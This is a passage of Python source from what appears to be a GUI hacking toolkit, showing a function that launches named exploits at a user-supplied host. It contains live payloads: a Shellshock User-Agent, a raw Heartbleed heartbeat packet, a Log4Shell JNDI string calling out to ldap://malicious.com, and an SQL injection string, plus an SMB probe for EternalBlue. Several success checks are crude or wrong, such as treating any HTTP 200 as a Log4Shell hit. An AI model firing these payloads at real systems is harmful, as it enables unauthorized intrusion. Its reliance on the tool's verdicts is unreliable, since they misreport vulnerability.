        exploit_combo.pack(pady=5)
        output = scrolledtext.ScrolledText(frame, width=100, height=20)
        output.pack(pady=10)
        self.setup_tags(output)

        def launch():
            host, exploit = host_entry.get(), exploit_combo.get()
            if not host or not exploit:
                output.insert(tk.END, "Please enter host and select an exploit!\n", "error")
                return
            output.delete(1.0, tk.END)
            output.insert(tk.END, f"Launching {exploit} on {host}...\n", "info")
            self.log(f"Exploit {exploit} on {host}")
            try:
                if "Shellshock" in exploit:
                    headers = {"User-Agent": "() { :;}; echo vulnerable"}
                    resp = requests.get(f"http://{host}/cgi-bin/vuln.cgi", headers=headers, timeout=5)
                    if "vulnerable" in resp.text:
                        output.insert(tk.END, "Shellshock exploited!\n", "error")
                elif "Heartbleed" in exploit:
                    host_port = f"{host}:443"
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((host, 443))
                    sock = ssl.wrap_socket(sock)
                    sock.send(b"\x18\x03\x02\x00\x03\x01\x40\x00")
                    data = sock.recv(16384)
                    if len(data) > 3:
                        output.insert(tk.END, f"Heartbleed vulnerable! Leaked: {data[:100]}\n", "error")
                    else:
                        output.insert(tk.END, "Not vulnerable.\n", "success")
                    sock.close()
                elif "EternalBlue" in exploit:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    if sock.connect_ex((host, 445)) == 0:
                        output.insert(tk.END, "EternalBlue possible! Requires SMB exploit script.\n", "error")
                    else:
                        output.insert(tk.END, "SMB not accessible.\n", "success")
                    sock.close()
                elif "Log4Shell" in exploit:
                    headers = {"User-Agent": "${jndi:ldap://malicious.com/a}"}
                    resp = requests.get(f"http://{host}", headers=headers, timeout=5)
                    if resp.status_code == 200:
                        output.insert(tk.END, "Log4Shell triggered!\n", "error")
                elif "SQLi" in exploit:
                    resp = requests.get(f"http://{host}/vulnerable?q=1' OR '1'='1", timeout=5)
                    if "error" in resp.text.lower():
                        output.insert(tk.END, "SQLi exploit succeeded!\n", "error")
                elif "ZeroLogon" in exploit:
                    output.insert(tk.END, "ZeroLogon requires DC access - not implemented.\n", "info")
                self.prompt_save(output.get(1.0, tk.END), "exploit_launch")
            except Exception as e:
                output.insert(tk.END, f"Error: {e}\n", "error")

